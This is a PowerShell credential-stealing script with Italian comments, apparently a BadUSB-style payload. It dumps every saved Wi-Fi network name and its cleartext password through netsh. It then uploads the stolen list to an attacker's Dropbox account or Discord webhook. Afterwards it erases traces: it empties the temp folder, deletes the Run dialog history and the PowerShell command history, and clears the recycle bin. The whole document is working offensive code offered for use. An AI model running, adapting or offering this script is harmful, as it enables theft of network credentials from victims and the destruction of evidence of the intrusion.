############################################################################################################################################################

# Estrazione dei profili Wi-Fi e delle password
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

# Salva i profili Wi-Fi e le password in un file temporaneo
$wifiProfiles > $env:TEMP/--wifi-pass.txt

# Log per verificare se i profili sono stati estratti correttamente
$wifiProfiles | Out-File -FilePath "$env:TEMP/wifi-log.txt" -Append

############################################################################################################################################################

# Funzione per il caricamento su Dropbox
function DropBox-Upload {

    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Controlla se esiste una chiave per Dropbox e carica il file
if (-not ([string]::IsNullOrEmpty($db))) {
    DropBox-Upload -f $env:TEMP/--wifi-pass.txt
}

############################################################################################################################################################

# Funzione per il caricamento su Discord
function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    # Se è presente del testo, invia un messaggio
    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Se è presente un file, invia il file
    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Aggiungi una pausa per assicurarti che il file sia salvato correttamente
Start-Sleep -Seconds 2

# Verifica se il file contiene effettivamente password
if ((Get-Content $env:TEMP/--wifi-pass.txt).Length -eq 0) {
    Write-Host "No Wi-Fi passwords found. Check wifi-log.txt for details."
} else {
    Write-Host "Wi-Fi passwords found. Uploading to Discord."
    if (-not ([string]::IsNullOrEmpty($dc))) {
        Upload-Discord -file "$env:TEMP/--wifi-pass.txt"
    }
}

############################################################################################################################################################

# Funzione per la pulizia dopo l'exfiltrazione dei dati
function Clean-Exfil { 

    # Svuota la cartella temporanea
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

    # Cancella la cronologia della finestra Esegui
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

    # Cancella la cronologia di PowerShell
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Svuota il cestino
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

# Se la variabile $ce è definita, esegue la pulizia
if (-not ([string]::IsNullOrEmpty($ce))) {
    Clean-Exfil
}

# Rimuove il file delle password Wi-Fi temporaneo
RI $env:TEMP/--wifi-pass.txt
